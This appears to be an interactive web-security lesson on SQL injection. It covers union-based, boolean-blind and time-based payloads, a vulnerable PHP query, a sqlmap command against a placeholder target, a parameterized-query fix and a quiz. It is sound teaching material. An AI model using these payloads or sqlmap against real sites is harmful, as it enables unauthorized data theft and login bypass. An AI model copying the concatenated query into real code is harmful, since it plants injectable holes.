
# SQL Injection (SQLi): Union & Blind

## The King of Vulnerabilities
SQL Injection occurs when untrusted user input is directly concatenated into a database query without sanitization. It allows an attacker to manipulate the query to view, delete, or modify data.

## 1. The Mechanic: String Concatenation
Imagine a login code like this:
<CodeBlock language="php" showLineNumbers code={`$username = $_POST['user'];
$query = "SELECT * FROM users WHERE user = '" . $username . "'";
`} />

If I enter `admin' --`, the query becomes:
`SELECT * FROM users WHERE user = 'admin' --'`
The `--` comments out the rest, bypassing the password check.

## 2. Union-Based SQLi (Visible)
This is the easiest type. The application *displays* the results of your query on the screen (e.g., a search bar).

**Goal:** Use the `UNION` operator to combine the results of the original query with a new query that steals data.

### Step 1: Find the number of columns
`' ORDER BY 1--` (No Error)
`' ORDER BY 2--` (No Error)
`' ORDER BY 3--` (Error!)
-> The current table has **2 columns**.

### Step 2: Extract Data
`' UNION SELECT user(), database()--`

<Mermaid chart={`
graph TD
    A[Original Query: SELECT name, desc FROM products] --> C{UNION}
    B[Injected Query: SELECT user, password FROM users] --> C
    C --> D[Result displayed on page]
    style B fill:#b91c1c,stroke:#fff,stroke-width:2px,color:#fff
`} />

## 3. Blind SQLi (Invisible)
The application does *not* show database errors or results. It only says "Welcome" or "Invalid Login".

### Boolean-Based
We ask True/False questions.
-   **Payload:** `admin' AND 1=1--` -> Logged in (TRUE).
-   **Payload:** `admin' AND 1=0--` -> Login failed (FALSE).
-   **Extraction:** `admin' AND ascii(substring(user(),1,1)) > 100--`
    -   If TRUE, the first letter of the username has an ASCII code > 100. We binary search the whole database this way.

### Time-Based
If even True/False is hidden, we use time.
-   **Payload:** `admin'; IF(1=1, SLEEP(10), 0)--`
-   **Result:** If the page takes 10 seconds to load, we know our condition was TRUE.

## 4. The Nuclear Option: SQLMap
Manual injection is good for understanding, but for dumping a 10GB database, we use `sqlmap`.

<TerminalSimulator 
    cmd="sqlmap -u 'http://target.com/product.php?id=1' --dbs --batch" 
    output={`[+] Testing 'AND boolean-based blind - WHERE or HAVING clause'
[+] Testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
...
[+] Parameter 'id' is vulnerable.
[+] Methods:
    - Boolean-based blind
    - Error-based
    - Time-based blind
    - UNION query
[+] available databases [4]:
    [*] information_schema
    [*] shop_db
    [*] users_db
    [*] mysql
`} 
/>

## Prevention
The **only** robust defense is **Prepared Statements (Parameterized Queries)**.
<CodeBlock language="php" showLineNumbers code={`// Secure Code
$stmt = $pdo->prepare('SELECT * FROM users WHERE user = :user');
$stmt->execute(['user' => $username]);
`} />

---

<Quiz 
    question="You inject `' ORDER BY 5--` and the page loads normally. You inject `' ORDER BY 6--` and the page crashes/errors. How many columns are in the SELECT statement?" 
    options={[
        "6",
        "5",
        "1",
        "Unknown"
    ]} 
    answer="5" 
/>
